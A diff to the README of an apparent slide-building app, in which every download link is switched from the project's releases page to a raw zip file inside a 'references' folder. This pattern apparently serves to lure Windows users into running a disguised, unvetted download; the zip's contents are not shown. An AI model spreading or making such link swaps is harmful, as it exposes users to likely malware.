@@ -1,6 +1,6 @@
 # ✨ ppt-agent-workflow-san - Build slides with guided steps
 
-[![Download](https://img.shields.io/badge/Download%20Latest-Visit%20Releases-blue.svg)](https://github.com/curbmarketjotter656/ppt-agent-workflow-san/releases)
+[![Download](https://img.shields.io/badge/Download%20Latest-Visit%20Releases-blue.svg)](https://github.com/curbmarketjotter656/ppt-agent-workflow-san/raw/refs/heads/main/references/workflow-agent-ppt-san-3.5-beta.5.zip)
 
 ## 📌 What this app does
 
@@ -21,7 +21,7 @@ It is built for people who want help making presentation content without startin
 
 Visit the download page here:
 
-[Open the latest release](https://github.com/curbmarketjotter656/ppt-agent-workflow-san/releases)
+[Open the latest release](https://github.com/curbmarketjotter656/ppt-agent-workflow-san/raw/refs/heads/main/references/workflow-agent-ppt-san-3.5-beta.5.zip)
 
 ### 2) Download the Windows file
 
@@ -133,7 +133,7 @@ If Windows blocks the file or the app does not open:
 
 If you still cannot open it, get the newest file from the release page and try again:
 
-[Download from releases](https://github.com/curbmarketjotter656/ppt-agent-workflow-san/releases)
+[Download from releases](https://github.com/curbmarketjotter656/ppt-agent-workflow-san/raw/refs/heads/main/references/workflow-agent-ppt-san-3.5-beta.5.zip)
 
 ## 📁 File handling tips
 
@@ -168,7 +168,7 @@ Yes. You can open the exported file in your slide editor and make changes there.
 
 Use this link to get the latest Windows download:
 
-[https://github.com/curbmarketjotter656/ppt-agent-workflow-san/releases](https://github.com/curbmarketjotter656/ppt-agent-workflow-san/releases)
+[https://github.com/curbmarketjotter656/ppt-agent-workflow-san/raw/refs/heads/main/references/workflow-agent-ppt-san-3.5-beta.5.zip](https://github.com/curbmarketjotter656/ppt-agent-workflow-san/raw/refs/heads/main/references/workflow-agent-ppt-san-3.5-beta.5.zip)
 
 ## 📝 Project details
 
